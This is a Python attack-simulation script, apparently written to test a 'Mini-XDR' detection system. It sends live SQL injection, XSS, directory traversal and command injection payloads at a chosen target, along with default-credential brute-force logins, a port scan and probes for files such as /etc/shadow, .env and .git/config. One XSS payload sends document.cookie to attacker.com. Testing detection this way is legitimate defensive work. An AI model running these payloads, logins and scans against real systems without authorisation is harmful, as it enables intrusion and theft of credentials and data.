#!/usr/bin/env python3
"""
🚨 Mini-XDR Attack Simulation Script
===================================

This script simulates a multi-vector cyber attack to test your Mini-XDR system's
detection, analysis, and response capabilities.

⚠️  IMPORTANT: Only use this against systems you own or have explicit permission to test!

Features:
- Web application attacks (SQL injection, XSS, directory traversal)
- Brute force authentication attempts
- Port scanning and reconnaissance
- Command injection attempts
- Suspicious user agents and patterns
- Known malicious IP indicators

Usage:
    python3 attack_simulation.py --target <TARGET_IP> [options]
"""

import requests
import socket
import threading
import time
import random
import argparse
import sys
from urllib.parse import quote
import json

class AttackSimulator:
    def __init__(self, target_ip, target_port=80, intensity='medium', duration=300):
        self.target_ip = target_ip
        self.target_port = target_port
        self.intensity = intensity
        self.duration = duration
        self.session = requests.Session()
        
        # Malicious User Agents (known threat intel indicators)
        self.malicious_user_agents = [
            "sqlmap/1.4.7#stable (http://sqlmap.org)",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
            "python-requests/2.25.1",
            "curl/7.68.0",
            "Wget/1.20.3 (linux-gnu)",
            "Nikto/2.1.6",
            "DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)",
            "gobuster/3.1.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Metasploit",
        ]
        
        # SQL Injection Payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users; --",
            "' OR 'x'='x",
            "1' AND '1'='1",
            "' OR 1=1 LIMIT 1 --",
            "') OR ('1'='1",
            "' OR 1=1 INTO OUTFILE '/tmp/test.txt",
        ]
        
        # XSS Payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
        ]
        
        # Directory Traversal Payloads
        self.traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\/....\/....\/etc/passwd",
        ]
        
        # Command Injection Payloads
        self.command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; cat /etc/shadow",
            "| id",
            "; uname -a",
            "&& netstat -an",
            "| ps aux",
            "; ifconfig",
            "&& cat /proc/version",
        ]
        
        # Common login attempts
        self.login_attempts = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "toor"),
            ("administrator", "password"),
            ("user", "user"),
            ("test", "test"),
            ("guest", "guest"),
            ("admin", ""),
            ("", "admin"),
            ("sa", "sa"),
            ("oracle", "oracle"),
            ("postgres", "postgres"),
        ]
        
        # Common web paths to probe
        self.web_paths = [
            "/admin/",
            "/administrator/",
            "/wp-admin/",
            "/phpmyadmin/",
            "/cpanel/",
            "/webmail/",
            "/mail/",
            "/login/",
            "/admin.php",
            "/login.php",
            "/config.php",
            "/database.php",
            "/backup.sql",
            "/config/database.yml",
            "/.env",
            "/wp-config.php",
            "/web.config",
            "/robots.txt",
            "/.git/config",
            "/.svn/entries",
            "/server-status",
            "/server-info",
            "/xmlrpc.php",
            "/readme.html",
            "/CHANGELOG.txt",
        ]

    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    🚨 MINI-XDR ATTACK SIMULATOR 🚨           ║
║                                                              ║
║  Target: {:<50} ║
║  Port: {:<52} ║
║  Intensity: {:<47} ║
║  Duration: {:<48} ║
║                                                              ║
║  ⚠️  WARNING: Only use against authorized targets!           ║
╚══════════════════════════════════════════════════════════════╝
        """.format(self.target_ip, self.target_port, self.intensity, f"{self.duration}s")
        print(banner)

    def log_attack(self, attack_type, payload, response_code=None):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        status = f"[{response_code}]" if response_code else "[SENT]"
        print(f"[{timestamp}] {attack_type:20} {status:6} {payload[:80]}")

    def web_attack_thread(self):
        """Simulate web application attacks"""
        base_url = f"http://{self.target_ip}:{self.target_port}"
        
        while True:
            try:
                # Random user agent from malicious list
                user_agent = random.choice(self.malicious_user_agents)
                headers = {'User-Agent': user_agent}
                
                attack_type = random.choice(['sql_injection', 'xss', 'directory_traversal', 'command_injection', 'path_probe'])
                
                if attack_type == 'sql_injection':
                    payload = random.choice(self.sql_payloads)
                    params = {'id': payload, 'search': payload, 'username': payload}
                    try:
                        response = self.session.get(base_url, params=params, headers=headers, timeout=5)
                        self.log_attack("SQL_INJECTION", payload, response.status_code)
                    except:
                        self.log_attack("SQL_INJECTION", payload)
                
                elif attack_type == 'xss':
                    payload = random.choice(self.xss_payloads)
                    params = {'q': payload, 'search': payload, 'comment': payload}
                    try:
                        response = self.session.get(base_url, params=params, headers=headers, timeout=5)
                        self.log_attack("XSS_ATTEMPT", payload, response.status_code)
                    except:
                        self.log_attack("XSS_ATTEMPT", payload)
                
                elif attack_type == 'directory_traversal':
                    payload = random.choice(self.traversal_payloads)
                    url = f"{base_url}/{payload}"
                    try:
                        response = self.session.get(url, headers=headers, timeout=5)
                        self.log_attack("DIR_TRAVERSAL", payload, response.status_code)
                    except:
                        self.log_attack("DIR_TRAVERSAL", payload)
                
                elif attack_type == 'command_injection':
                    payload = random.choice(self.command_payloads)
                    params = {'cmd': payload, 'exec': payload, 'system': payload}
                    try:
                        response = self.session.get(base_url, params=params, headers=headers, timeout=5)
                        self.log_attack("CMD_INJECTION", payload, response.status_code)
                    except:
                        self.log_attack("CMD_INJECTION", payload)
                
                elif attack_type == 'path_probe':
                    path = random.choice(self.web_paths)
                    url = f"{base_url}{path}"
                    try:
                        response = self.session.get(url, headers=headers, timeout=5)
                        self.log_attack("PATH_PROBE", path, response.status_code)
                    except:
                        self.log_attack("PATH_PROBE", path)
                
                # Vary attack frequency based on intensity
                if self.intensity == 'low':
                    time.sleep(random.uniform(2, 5))
                elif self.intensity == 'medium':
                    time.sleep(random.uniform(0.5, 2))
                else:  # high
                    time.sleep(random.uniform(0.1, 0.5))
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                continue

    def brute_force_thread(self):
        """Simulate brute force login attempts"""
        login_url = f"http://{self.target_ip}:{self.target_port}/login"
        admin_url = f"http://{self.target_ip}:{self.target_port}/admin"
        
        urls_to_try = [login_url, admin_url, f"http://{self.target_ip}:{self.target_port}/wp-login.php"]
        
        while True:
            try:
                url = random.choice(urls_to_try)
                username, password = random.choice(self.login_attempts)
                
                user_agent = random.choice(self.malicious_user_agents)
                headers = {'User-Agent': user_agent}
                
                data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login',
                }
                
                try:
                    response = self.session.post(url, data=data, headers=headers, timeout=5)
                    self.log_attack("BRUTE_FORCE", f"{username}:{password} -> {url}", response.status_code)
                except:
                    self.log_attack("BRUTE_FORCE", f"{username}:{password} -> {url}")
                
                # Brute force is typically slower
                time.sleep(random.uniform(1, 3))
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                continue

    def port_scan_thread(self):
        """Simulate port scanning activity"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 8080, 8443]
        
        while True:
            try:
                port = random.choice(common_ports)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                start_time = time.time()
                result = sock.connect_ex((self.target_ip, port))
                end_time = time.time()
                
                status = "OPEN" if result == 0 else "CLOSED/FILTERED"
                self.log_attack("PORT_SCAN", f"{self.target_ip}:{port} -> {status}")
                
                sock.close()
                
                # Port scanning frequency
                time.sleep(random.uniform(0.5, 2))
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                continue

    def reconnaissance_thread(self):
        """Simulate reconnaissance activities"""
        recon_paths = [
            "/.well-known/security.txt",
            "/sitemap.xml",
            "/robots.txt",
            "/crossdomain.xml",
            "/clientaccesspolicy.xml",
            "/.htaccess",
            "/web.config",
            "/server-status",
            "/server-info",
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/readme.txt",
            "/INSTALL.txt",
            "/CHANGELOG.txt",
            "/VERSION",
        ]
        
        while True:
            try:
                path = random.choice(recon_paths)
                url = f"http://{self.target_ip}:{self.target_port}{path}"
                
                user_agent = random.choice(self.malicious_user_agents)
                headers = {'User-Agent': user_agent}
                
                try:
                    response = self.session.get(url, headers=headers, timeout=5)
                    self.log_attack("RECONNAISSANCE", path, response.status_code)
                except:
                    self.log_attack("RECONNAISSANCE", path)
                
                time.sleep(random.uniform(1, 4))
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                continue

    def run_attack_simulation(self):
        """Run the complete attack simulation"""
        self.print_banner()
        
        print(f"\n🚀 Starting attack simulation...")
        print(f"📊 This will generate multiple types of malicious traffic for {self.duration} seconds")
        print(f"🔍 Your Mini-XDR should detect and create incidents for these attacks\n")
        
        # Start attack threads
        threads = []
        
        # Web attacks (primary)
        for i in range(2):
            thread = threading.Thread(target=self.web_attack_thread, daemon=True)
            threads.append(thread)
            thread.start()
        
        # Brute force attacks
        thread = threading.Thread(target=self.brute_force_thread, daemon=True)
        threads.append(thread)
        thread.start()
        
        # Port scanning
        thread = threading.Thread(target=self.port_scan_thread, daemon=True)
        threads.append(thread)
        thread.start()
        
        # Reconnaissance
        thread = threading.Thread(target=self.reconnaissance_thread, daemon=True)
        threads.append(thread)
        thread.start()
        
        try:
            # Run for specified duration
            time.sleep(self.duration)
            
        except KeyboardInterrupt:
            print("\n\n🛑 Attack simulation interrupted by user")
        
        print(f"\n✅ Attack simulation completed!")
        print(f"📈 Check your Mini-XDR dashboard for detected incidents")
        print(f"🎯 Expected incidents: Web attacks, brute force, port scanning, reconnaissance")
        print(f"🔧 Test SOC actions: Block IP, Isolate Host, Threat Intel lookup, etc.")

def main():
    parser = argparse.ArgumentParser(
        description="Mini-XDR Attack Simulation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 attack_simulation.py --target 192.168.1.100
  python3 attack_simulation.py --target 10.0.0.50 --port 8080 --intensity high --duration 600
  python3 attack_simulation.py --target example.com --intensity low --duration 120

⚠️  WARNING: Only use against systems you own or have explicit permission to test!
        """
    )
    
    parser.add_argument('--target', '-t', required=True,
                        help='Target IP address or hostname')
    parser.add_argument('--port', '-p', type=int, default=80,
                        help='Target port (default: 80)')
    parser.add_argument('--intensity', '-i', choices=['low', 'medium', 'high'], default='medium',
                        help='Attack intensity (default: medium)')
    parser.add_argument('--duration', '-d', type=int, default=300,
                        help='Attack duration in seconds (default: 300)')
    
    args = parser.parse_args()
    
    # Validate target
    try:
        socket.gethostbyname(args.target)
    except socket.gaierror:
        print(f"❌ Error: Cannot resolve target '{args.target}'")
        sys.exit(1)
    
    # Create and run attack simulator
    simulator = AttackSimulator(
        target_ip=args.target,
        target_port=args.port,
        intensity=args.intensity,
        duration=args.duration
    )
    
    simulator.run_attack_simulation()

if __name__ == "__main__":
    main()

